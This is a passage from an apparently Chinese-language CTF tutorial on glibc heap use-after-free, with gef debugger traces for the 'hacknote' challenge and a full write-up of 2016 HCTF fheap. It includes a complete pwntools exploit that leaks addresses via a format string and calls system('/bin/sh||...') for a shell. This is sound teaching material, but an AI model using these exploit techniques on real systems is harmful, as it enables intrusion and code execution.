\u2500[ stack ]\u2500\u2500\u2500\u2500 ['0xffffcf20', 'l8'] 8 0xffffcf20\u2502+0x00: 0x0804b008 \u2192 0x0804865b \u2192 <print_note_content+0> push ebp \u2190 $esp \u5f53 delete \u7ed3\u675f\u540e\uff0c\u6211\u4eec\u89c2\u770b\u4e00\u4e0b bins\uff0c\u53ef\u4ee5\u53d1\u73b0\uff0c\u786e\u5b9e\u5176\u88ab\u5b58\u653e\u5728\u5bf9\u5e94\u7684 fast bin \u4e2d\uff0c gef\u27a4 heap bins \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ Fastbins for arena 0xf7fac780 ]\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 Fastbins[idx=0, size=0x8] \u2190 UsedChunk(addr=0x804b008, size=0x10) Fastbins[idx=1, size=0xc] 0x00 Fastbins[idx=2, size=0x10] 0x00 Fastbins[idx=3, size=0x14] \u2190 UsedChunk(addr=0x804b018, size=0x28) Fastbins[idx=4, size=0x18] 0x00 Fastbins[idx=5, size=0x1c] 0x00 Fastbins[idx=6, size=0x20] 0x00 \u5f53\u6211\u4eec\u5c06 note1 \u4e5f\u5168\u90e8\u5220\u9664\u5b8c\u6bd5\u540e\uff0c\u518d\u6b21\u89c2\u770b bins\u3002\u53ef\u4ee5\u770b\u51fa\uff0c\u540e\u5220\u9664\u7684 chunk \u5757\u786e\u5b9e\u5904\u4e8e\u8868\u5934\u3002 gef\u27a4 heap bins \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ Fastbins for arena 0xf7fac780 ]\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 Fastbins[idx=0, size=0x8] \u2190 UsedChunk(addr=0x804b040, size=0x10) \u2190 UsedChunk(addr=0x804b008, size=0x10) Fastbins[idx=1, size=0xc] 0x00 Fastbins[idx=2, size=0x10] 0x00 Fastbins[idx=3, size=0x14] \u2190 UsedChunk(addr=0x804b050, size=0x28) \u2190 UsedChunk(addr=0x804b018, size=0x28) Fastbins[idx=4, size=0x18] 0x00 Fastbins[idx=5, size=0x1c] 0x00 Fastbins[idx=6, size=0x20] 0x00 \u90a3\u4e48\uff0c\u6b64\u65f6\u5373\u5c06\u8981\u7533\u8bf7 note2\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u4e0b note2 \u90fd\u7533\u8bf7\u5230\u4e86\u4ec0\u4e48\u5185\u5b58\u5757\uff0c\u5982\u4e0b \u7533\u8bf7 note2 \u5bf9\u5e94\u7684\u5185\u5b58\u5757\u4e3a 0x804b040\uff0c\u5176\u5b9e\u5c31\u662f note1 \u5bf9\u5e94\u7684\u5185\u5b58\u5730\u5740\u3002 [+] Heap-Analysis - malloc(8)=0x804b040 [+] Heap-Analysis - malloc(8)=0x804b040 0x080486cf in add_note () \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ registers ]\u2500\u2500\u2500\u2500 $eax : 0x0804b040 \u2192 0x0804b000 \u2192 0x00000000 $ebx : 0x00000000 $ecx : 0xf7fac780 \u2192 0x00000000 $edx : 0x0804b040 \u2192 0x0804b000 \u2192 0x00000000 $esp : 0xffffcf10 \u2192 0x00000008 $ebp : 0xffffcf48 \u2192 0xffffcf68 \u2192 0x00000000 $esi : 0xf7fac000 \u2192 0x001b1db0 $edi : 0xf7fac000 \u2192 0x001b1db0 $eip : 0x080486cf \u2192 <add_note+89> add esp, 0x10 $cs : 0x00000023 $ss : 0x0000002b $ds : 0x0000002b $es : 0x0000002b $fs : 0x00000000 $gs : 0x00000063 $eflags: [carry PARITY adjust ZERO sign trap INTERRUPT direction overflow resume virtualx86 identification] \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ code:i386 ]\u2500\u2500\u2500\u2500 0x80486c2 <add_note+76> add DWORD PTR [eax], eax 0x80486c4 <add_note+78> add BYTE PTR [ebx+0x86a0cec], al 0x80486ca <add_note+84> call 0x80484e0 <malloc@plt> \u2192 0x80486cf <add_note+89> add esp, 0x10 \u7533\u8bf7 note2 \u7684 content \u7684\u5185\u5b58\u5730\u5740\u4e3a 0x804b008\uff0c\u5c31\u662f note0 \u5bf9\u5e94\u7684\u5730\u5740\uff0c\u5373\u6b64\u65f6\u6211\u4eec\u5411 note2 \u7684 content \u5199\u5185\u5bb9\uff0c\u5c31\u4f1a\u5c06 note0 \u7684 put \u5b57\u6bb5\u8986\u76d6\u3002 gef\u27a4 n 1 [+] Heap-Analysis - malloc(8)=0x804b008 [+] Heap-Analysis - malloc(8)=0x804b008 0x08048761 in add_note () \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ registers ]\u2500\u2500\u2500\u2500 $eax : 0x0804b008 \u2192 0x00000000 $ebx : 0x0804b040 \u2192 0x0804865b \u2192 <print_note_content+0> push ebp $ecx : 0xf7fac780 \u2192 0x00000000 $edx : 0x0804b008 \u2192 0x00000000 $esp : 0xffffcf10 \u2192 0x00000008 $ebp : 0xffffcf48 \u2192 0xffffcf68 \u2192 0x00000000 $esi : 0xf7fac000 \u2192 0x001b1db0 $edi : 0xf7fac000 \u2192 0x001b1db0 $eip : 0x08048761 \u2192 <add_note+235> add esp, 0x10 $cs : 0x00000023 $ss : 0x0000002b $ds : 0x0000002b $es : 0x0000002b $fs : 0x00000000 $gs : 0x00000063 $eflags: [carry PARITY adjust ZERO sign trap INTERRUPT direction overflow resume virtualx86 identification] \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ code:i386 ]\u2500\u2500\u2500\u2500 0x8048752 <add_note+220> mov al, ds:0x458b0804 0x8048757 <add_note+225> call 0x581173df 0x804875c <add_note+230> call 0x80484e0 <malloc@plt> \u2192 0x8048761 <add_note+235> add esp, 0x10 \u6211\u4eec\u6765\u5177\u4f53\u68c0\u9a8c\u4e00\u4e0b\uff0c\u770b\u4e00\u4e0b\u8986\u76d6\u524d\u7684\u60c5\u51b5\uff0c\u53ef\u4ee5\u770b\u5230\u8be5\u5185\u5b58\u5757\u7684 put \u6307\u9488\u5df2\u7ecf\u88ab\u7f6e\u4e3a NULL \u4e86\uff0c\u8fd9\u662f\u7531 fastbin \u7684 free \u673a\u5236\u51b3\u5b9a\u7684\u3002 gef\u27a4 x/2xw 0x804b008 0x804b008: 0x00000000 0x0804b018 \u8986\u76d6\u540e\uff0c\u5177\u4f53\u7684\u503c\u5982\u4e0b gef\u27a4 x/2xw 0x804b008 0x804b008: 0x08048986 0x0804b00a gef\u27a4 x/i 0x08048986 0x8048986 <magic>: push ebp \u53ef\u4ee5\u770b\u51fa\uff0c\u786e\u5b9e\u5df2\u7ecf\u88ab\u8986\u76d6\u4e3a\u6211\u4eec\u6240\u60f3\u8981\u7684 magic \u51fd\u6570\u4e86\u3002 \u6700\u540e\u6267\u884c\u7684\u6548\u679c\u5982\u4e0b [+] Starting local process './hacknote': pid 35030 [*] Switching to interactive mode flag{use_after_free}---------------------- HackNote ---------------------- 1. Add note 2. Delete note 3. Print note 4. Exit ---------------------- \u540c\u65f6\uff0c\u6211\u4eec\u8fd8\u53ef\u4ee5\u501f\u52a9 gef \u7684 heap-analysis-helper \u6765\u770b\u4e00\u4e0b\u6574\u4f53\u7684\u5806\u7684\u7533\u8bf7\u4e0e\u91ca\u653e\u7684\u60c5\u51b5\uff0c\u5982\u4e0b gef\u27a4 heap-analysis-helper [*] This feature is under development, expect bugs and unstability... [+] Tracking malloc() [+] Tracking free() [+] Tracking realloc() [+] Disabling hardware watchpoints (this may increase the latency) [+] Dynamic breakpoints correctly setup, GEF will break execution if a possible vulnerabity is found. [*] Note: The heap analysis slows down noticeably the execution. gef\u27a4 c Continuing. [+] Heap-Analysis - malloc(8)=0x804b008 [+] Heap-Analysis - malloc(8)=0x804b008 [+] Heap-Analysis - malloc(32)=0x804b018 [+] Heap-Analysis - malloc(8)=0x804b040 [+] Heap-Analysis - malloc(32)=0x804b050 [+] Heap-Analysis - free(0x804b018) [+] Heap-Analysis - watching 0x804b018 [+] Heap-Analysis - free(0x804b008) [+] Heap-Analysis - watching 0x804b008 [+] Heap-Analysis - free(0x804b050) [+] Heap-Analysis - watching 0x804b050 [+] Heap-Analysis - free(0x804b040) [+] Heap-Analysis - watching 0x804b040 [+] Heap-Analysis - malloc(8)=0x804b040 [+] Heap-Analysis - malloc(8)=0x804b008 [+] Heap-Analysis - Cleaning up [+] Heap-Analysis - Re-enabling hardware watchpoints [New process 36248] process 36248 is executing new program: /bin/dash [New process 36249] process 36249 is executing new program: /bin/cat [Inferior 3 (process 36249) exited normally] \u8fd9\u91cc\u7b2c\u4e00\u4e2a\u8f93\u51fa\u4e86\u4e24\u6b21\uff0c\u5e94\u8be5\u662f gef \u5de5\u5177\u7684\u95ee\u9898\u3002 \u9898\u76ee \u00b6 2016 HCTF fheap \u00b6 \u57fa\u672c\u60c5\u51b5 \u00b6 1 2 3 4 5 Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled \u57fa\u672c\u529f\u80fd \u00b6 \u9609\u5272\u7248\u5806\u7ba1\u7406\u5668\uff0c\u6709\u589e\u5220\u529f\u80fd\u3002 // \u7ba1\u7406\u5806\u7684\u7ed3\u6784\u4f53 struct { int inuse ; String * str ; } Strings [ 0x10 ]; // \u5806\u7ed3\u6784\u4f53 typedef struct String { union { char * buf ; char array [ 16 ]; } o ; int len ; void ( * free )( struct String * ptr ); } String ; create string \u6709\u4e24\u79cd\u4e0d\u540c\u65b9\u5f0f\u6765\u50a8\u5b58\u5b57\u7b26\u4e32\uff1a \u5b57\u7b26\u4e32\u5757 < 16 , \u5728\u7ed3\u6784\u4f53\u5806\u5757\uff08String\uff09\u4e0a\u5b58\u653e\u8f93\u5165\u7684\u5b57\u7b26\u4e32\u3002 \u5b57\u7b26\u4e32\u5757>=16 , malloc \u4e00\u4e2a**\u8f93\u5165\u7684\u5b57\u7b26\u4e32\u957f\u5ea6 size** \u7684\u7a7a\u95f4\uff0c \u5c06\u8be5\u7a7a\u95f4\u5730\u5740\u5b58\u653e\u5728\u539f\u6765\u7684\u5806\u5757\u4e2d\u3002 \u6ce8\u610f\u662f malloc \u8f93\u5165\u7684\u5b57\u7b26\u4e32\u957f\u5ea6 \uff0c\u800c\u4e0d\u662f\u8f93\u5165\u7684 size \u3002\u81ea\u884c\u6839\u636e\u6e90\u7801\u5206\u6790\uff1a nbytesa = strlen ( & buf ); if ( nbytesa > 15 ) { dest = ( char * ) malloc ( nbytesa ); \u7ed3\u6784\u4f53\u5806\u5757\uff08String\uff09\u6700\u540e 8 \u4e2a\u5b57\u8282\u5b58\u653e\u7684\u662f free_func \u51fd\u6570\u5730\u5740\uff0c\u7528\u6765\u5728 delete \u7684\u65f6\u5019\u8c03\u7528\uff0c\u8fd9\u6837\u7684\u8bbe\u8ba1\u4e0e\u4e0a\u9762\u4f8b\u5b50\u4e00\u81f4\u3002\u5b57\u7b26\u4e32\u5757\u4e24\u79cd\u60c5\u51b5\u5bf9\u5e94\u4e24\u79cd\u4e0d\u540c\u7684 free_func \u3002 delete string \u6839\u636e\u8f93\u5165\u4e0b\u6807\u91ca\u653e chunk \u3002 \u6f0f\u6d1e \u00b6 delete \u64cd\u4f5c\u91ca\u653e chunk \u540e\uff0c\u6ca1\u6709\u5c06\u76f8\u5173\u7d22\u5f15\u6307\u9488\u7f6e\u96f6\uff0c\u800c\u4e14\u6ca1\u6709\u5bf9 chunk \u72b6\u6001\u8fdb\u884c\u4e25\u683c\u9650\u5236\uff0c\u4ec5\u4ec5\u9650\u5236\u4e0b\u6807\u8303\u56f4\uff0c\u4ee5\u53ca\u67e5\u8be2\u7d22\u5f15\u6307\u9488\u662f\u5426\u5b58\u5728\uff0c\u5e76\u6ca1\u6709\u68c0\u67e5 inuse \u4f4d\uff0c\u9020\u6210 UAF \u3001 Double free \u3002 \u601d\u8def \u00b6 \u5229\u7528 UAF \u63a7\u5236\u7ed3\u6784\u4f53\u5806\u5757\uff08String\uff09\u6700\u540e 8 \u5b57\u8282\uff0c\u4fee\u6539 free_func \u4e3a puts \u51fd\u6570\u5730\u5740\u3002\u91ca\u653e chunk \u6cc4\u9732\u51fd\u6570\u771f\u5b9e\u5730\u5740\uff0c\u901a\u8fc7\u8ba1\u7b97\u5f97\u51fa\u7a0b\u5e8f\u52a0\u8f7d\u57fa\u5730\u5740\u3002\u5b8c\u6210\u7ed5\u8fc7 PIE \u4fdd\u62a4\u3002 \u518d\u6b21 UAF \u63a7\u5236\u7ed3\u6784\u4f53\u5806\u5757\uff08String\uff09\u51fd\u6570\u5730\u5740\u4e3a printf \u51fd\u6570\uff0c\u6784\u9020\u51fa\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\uff0c\u6cc4\u9732\u6808\u4e0a\u4f4d\u4e8e libc \u6bb5\u7684\u5730\u5740\uff0c\u5b8c\u6210 libc \u5730\u5740\u6cc4\u9732\u3002 \u7b2c\u4e09\u6b21 UAF \u63a7\u5236\u7ed3\u6784\u4f53\u5806\u5757\uff08String\uff09\u51fd\u6570\u5730\u5740\u4e3a system \u51fd\u6570\uff0c\u5229\u7528 Linux \u547d\u4ee4\u884c\u7279\u6027 || \u5b8c\u6210 getshell UAF \u63a7\u5236\u601d\u8def\u548c\u4f8b\u9898\u5dee\u4e0d\u591a\uff0c\u4f46\u662f\u4e00\u4e2a\u95ee\u9898\u3002\u5982\u679c\u4f7f\u7528\u4e00\u6837\u7684 UAF \u5229\u7528\u65b9\u6cd5\u4f1a\u51fa\u73b0\u95ee\u9898\uff1a add ( 0x30 , 'a' * 0x30 ) #0 add ( 0x30 , 'a' * 0x30 ) #1 delete ( 1 ) delete ( 0 ) add ( 0x18 , 'b' * 0x18 ) \u8fd9\u6837\u4e0d\u80fd\u8fbe\u5230\u9884\u671f\u6548\u679c\uff0c\u65b0\u5806\u7684 string chunk \u7528\u7684\u4e0d\u662f chunk0 \u7ed3\u6784\u4f53\uff0c\u800c\u662f\u7ee7\u7eed\u4f7f\u7528 chunk2 string chunk \u3002\u540e\u7eed\u8bd5\u8fc7\u7533\u8bf7\u5927\u5c0f\u5404\u79cd string chunk \u90fd\u662f\u4e00\u6837\u60c5\u51b5\u3002 \u6240\u4ee5\u91c7\u7528\u7533\u8bf7\u4e24\u4e2a\u5c0f\u5806\uff08\u5b57\u7b26\u4e32\u957f\u5ea6\u5c0f\u4e8e 16\uff09\uff0c\u7136\u540e\u65b0\u5806\u7533\u8bf7\u4e00\u4e2a 0x20 \u5927\u5c0f\u7a7a\u95f4\u5b58\u653e string \uff0c\u8fd9\u6837 string \u5c31\u4f1a\u4f7f\u7528 chunk1 \u7ed3\u6784\u4f53\u5806\u3002 add ( 8 , 'a' * 8 ) add ( 8 , 'b' * 8 ) delete ( 1 ) delete ( 0 ) \u5728 free_short \u9644\u8fd1\u627e\u5230 call puts \u7684\u5730\u5740\uff1a0xd2d \u3002\u7136\u540e\u4f7f\u7528 partial write \u5c06 free_func \u6700\u4f4e\u4e00\u4e2a\u5b57\u8282\u4fee\u6539\u4e3a 0x2d \u3002\u91ca\u653e chunk1 \uff0c\u5c06 chunk1 \u7ed3\u6784\u4f53\u5185\u5bb9\u8f93\u5165\uff0c\u4ece\u800c\u6cc4\u9732\u51fd\u6570\u5730\u5740\uff0c\u8ba1\u7b97\u51fa\u7a0b\u5e8f\u52a0\u8f7d\u57fa\u5730\u5740\u3002 call_puts_addr = 0xd2d payload = 'a' * 0x18 + p64 ( call_puts_addr )[ 0 ] add ( len ( payload ), payload ) delete ( 1 ) p . recvuntil ( 'a' * 0x18 ) elf_base = u64 ( p . recv ( 6 ) . ljust ( 8 , ' \\x00 ' )) - call_puts_addr \u91ca\u653e chunk0 \u65b9\u4fbf\u6211\u4eec\u91cd\u590d\u5229\u7528\u8fd9\u4e24\u4e2a\u5806\uff0c\u7136\u540e\u91cd\u590d\u4e0a\u9762\u6b65\u9aa4\u627e\u5230 call printf \uff1a0xDBB \u3002\u9700\u8981\u5c06\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u5728\u7533\u8bf7\u5806\u65f6\u5199\u5165\u5728\u5f00\u5934\u3002\u504f\u79fb\u5730\u5740 gdb \u8c03\u8bd5\u627e\u5230\u4e00\u4e2a libc \u5185\u7684\u5730\u5740\u5373\u53ef\u3002 delete ( 0 ) payload = '%22$p' . ljust ( 0x18 , 'a' ) + p64 ( 0xDBB )[ 0 ] add ( len ( payload ), payload ) delete ( 1 ) \u8fd9\u6b65\u7ed3\u675f\u540e\u4f1a\u5361\u8f93\u5165\u6d41\uff0c\u8f93\u5165\u4e24\u884c\u5b57\u7b26\u5373\u53ef\uff1a p . sendline ( 'skye' ) p . sendline ( 'skye' ) \u518d\u6b21\u91ca\u653e chunk0 \u5e76\u7533\u8bf7\uff0c\u8fd9\u6b21\u5c06\u51fd\u6570\u5730\u5740\u4fee\u6539\u4e3a system \u5730\u5740\uff0c/bin/sh \u8f93\u5165\u5728\u5f00\u5934\u3002\u7531\u4e8e\u7a0b\u5e8f\u8f93\u5165\u51fd\u6570\u4e0d\u80fd\u8bfb\u5165 \\x00 \uff0c\u6240\u4ee5\u7528 || \u5206\u9694\u586b\u5145\u5185\u5bb9\uff0c\u539f\u56e0\u5982\u4e0b\uff1a \u5206\u9694\u7b26 \u8bf4\u660e && \u7b2c2\u6761\u547d\u4ee4\u53ea\u6709\u5728\u7b2c1\u6761\u547d\u4ee4\u6210\u529f\u6267\u884c\u4e4b\u540e\u624d\u6267\u884c || \u53ea\u6709 || \u524d\u7684\u547d\u4ee4\u6267\u884c\u4e0d\u6210\u529f\uff08\u4ea7\u751f\u4e86\u4e00\u4e2a\u975e0\u7684\u9000\u51fa\u7801\uff09\u65f6\uff0c\u624d\u6267\u884c\u540e\u9762\u7684\u547d\u4ee4\u3002 \uff1b \u5f53;\u53f7\u524d\u7684\u547d\u4ee4\u6267\u884c\u5b8c\uff0c \u4e0d\u7ba1\u662f\u5426\u6267\u884c\u6210\u529f\uff0c\u6267\u884c;\u540e\u7684\u547d\u4ee4 EXP \u00b6 #!/usr/bin/env python # -*- coding: utf-8 -*- # @Author : MrSkYe # @Email : skye231@foxmail.com # @File : pwn-f.py from pwn import * context ( log_level = 'debug' , os = 'linux' , arch = 'amd64' ) # p = process(\"./pwn-f\") p = remote ( \"node3.buuoj.cn\" , 29256 ) elf = ELF ( \"./pwn-f\" ) libc = ELF ( \"/lib/x86_64-linux-gnu/libc.so.6\" ) def add ( size , content ): p . recvuntil ( \"3.quit \\n \" ) p . sendline ( \"create string\" ) p . recvuntil ( \"size:\" ) p . sendline ( str ( size )) p . recvuntil ( \"str:\" ) p . send ( content ) def delete ( id ): p . recvuntil ( \"3.quit \\n \" ) p . sendline ( \"delete string\" ) p . recvuntil ( \"id:\" ) p . sendline ( str ( id )) p . recvuntil ( \"sure?:\" ) p . sendline ( 'yes' ) # UAF add ( 8 , 'a' * 8 ) add ( 8 , 'b' * 8 ) delete ( 1 ) delete ( 0 ) # overwrite free_func 2 puts call_puts_addr = 0xd2d payload = 'a' * 0x18 + p64 ( call_puts_addr )[ 0 ] add ( len ( payload ), payload ) # leak libc delete ( 1 ) p . recvuntil ( 'a' * 0x18 ) elf_base = u64 ( p . recv ( 6 ) . ljust ( 8 , ' \\x00 ' )) - call_puts_addr log . info ( \"elf_base:\" + hex ( elf_base )) # printf_plt = elf_base + elf.plt['printf'] # log.info(\"printf_plt:\"+hex(printf_plt)) # overwrite 2 printf leak libc delete ( 0 ) payload = '%22$p' . ljust ( 0x18 , 'a' ) + p64 ( 0xDBB )[ 0 ] add ( len ( payload ), payload ) delete ( 1 ) leak_addr = int ( p . recv ( 14 ), 16 ) log . info ( \"leak_addr:\" + hex ( leak_addr )) libc_addr = leak_addr - 0x78c0f log . info ( \"libc_addr:\" + hex ( libc_addr )) system_addr = libc_addr + libc . sym [ 'system' ] log . info ( \"system_addr:\" + hex ( system_addr )) str_binsh = libc_addr + libc . search ( '/bin/sh' ) . next () log . info ( \"str_binsh:\" + hex ( str_binsh )) # one = [0x45226,0x4527a,0xf0364,0xf1207] # onegadget = one[0] + libc_addr # log.info(\"onegadget:\"+hex(onegadget)) p . sendline ( 'skye' ) p . sendline ( 'skye' ) # system('/bin/sh||aaa\u2026\u2026') delete ( 0 ) payload = '/bin/sh||' . ljust ( 0x18 , 'a' ) + p64 ( system_addr ) add ( len ( payload ), payload ) # gdb.attach(p,'b *$rebase(0x2020C0)') # # gdb.attach(p,'b *$rebase(0xDBB)') delete ( 1 ) p . interactive () \u5176\u4ed6\u89e3\u6cd5 \u00b6 hctf2016 fheap\u5b66\u4e60(FlappyPig\u961f\u4f0d\u7684\u89e3\u6cd5) hctf2016 fheap\u5b66\u4e60(FreeBuf\u53d1\u8868\u7684\u5b98\u65b9\u89e3\u6cd5) DlyELF \u6cc4\u9732 libc \u5730\u5740 hctf2016-fheap Writeup","title":"UAF"},{"location":"Pwn/glibc-heap/use_after_free/#use-after-free","text":"","title":"Use After Free"},{"location":"Pwn/glibc-heap/use_after_free/#_1","text":"\u7b80\u5355\u7684\u8bf4\uff0cUse After Free \u5c31\u662f\u5176\u5b57\u9762\u6240\u8868\u8fbe\u7684\u610f\u601d\uff0c\u5f53\u4e00\u4e2a\u5185\u5b58\u5757\u88ab\u91ca\u653e\u4e4b\u540e\u518d\u6b21\u88ab\u4f7f\u7528\u3002\u4f46\u662f\u5176\u5b9e\u8fd9\u91cc\u6709\u4ee5\u4e0b\u51e0\u79cd\u60c5\u51b5 \u5185\u5b58\u5757\u88ab\u91ca\u653e\u540e\uff0c\u5176\u5bf9\u5e94\u7684\u6307\u9488\u88ab\u8bbe\u7f6e\u4e3a NULL \uff0c \u7136\u540e\u518d\u6b21\u4f7f\u7528\uff0c\u81ea\u7136\u7a0b\u5e8f\u4f1a\u5d29\u6e83\u3002 \u5185\u5b58\u5757\u88ab\u91ca\u653e\u540e\uff0c\u5176\u5bf9\u5e94\u7684\u6307\u9488\u6ca1\u6709\u88ab\u8bbe\u7f6e\u4e3a NULL \uff0c\u7136\u540e\u5728\u5b83\u4e0b\u4e00\u6b21\u88ab\u4f7f\u7528\u4e4b\u524d\uff0c\u6ca1\u6709\u4ee3\u7801\u5bf9\u8fd9\u5757\u5185\u5b58\u5757\u8fdb\u884c\u4fee\u6539\uff0c\u90a3\u4e48**\u7a0b\u5e8f\u5f88\u6709\u53ef\u80fd\u53ef\u4ee5\u6b63\u5e38\u8fd0\u8f6c**\u3002 \u5185\u5b58\u5757\u88ab\u91ca\u653e\u540e\uff0c\u5176\u5bf9\u5e94\u7684\u6307\u9488\u6ca1\u6709\u88ab\u8bbe\u7f6e\u4e3a NULL\uff0c\u4f46\u662f\u5728\u5b83\u4e0b\u4e00\u6b21\u4f7f\u7528\u4e4b\u524d\uff0c\u6709\u4ee3\u7801\u5bf9\u8fd9\u5757\u5185\u5b58\u8fdb\u884c\u4e86\u4fee\u6539\uff0c\u90a3\u4e48\u5f53\u7a0b\u5e8f\u518d\u6b21\u4f7f\u7528\u8fd9\u5757\u5185\u5b58\u65f6\uff0c \u5c31\u5f88\u6709\u53ef\u80fd\u4f1a\u51fa\u73b0\u5947\u602a\u7684\u95ee\u9898 \u3002 \u800c\u6211\u4eec\u4e00\u822c\u6240\u6307\u7684 Use After Free \u6f0f\u6d1e\u4e3b\u8981\u662f\u540e\u4e24\u79cd\u3002\u6b64\u5916\uff0c \u6211\u4eec\u4e00\u822c\u79f0\u88ab\u91ca\u653e\u540e\u6ca1\u6709\u88ab\u8bbe\u7f6e\u4e3a NULL \u7684\u5185\u5b58\u6307\u9488\u4e3a dangling pointer\u3002 dangling pointer \uff1a \u60ac\u7a7a\u6307\u9488 wild pointer \uff1a\u91ce\u6307\u9488\uff0c\u6ca1\u6709\u88ab\u521d\u59cb\u5316\u8fc7\u7684\u6307\u9488 \u8fd9\u91cc\u7ed9\u51fa\u4e00\u4e2a\u7b80\u5355\u7684\u4f8b\u5b50 #include <stdio.h> #include <stdlib.h> typedef struct name { char * myname ; void ( * func )( char * str ); } NAME ; void myprint ( char * str ) { printf ( \"%s \\n \" , str ); } void printmyname () 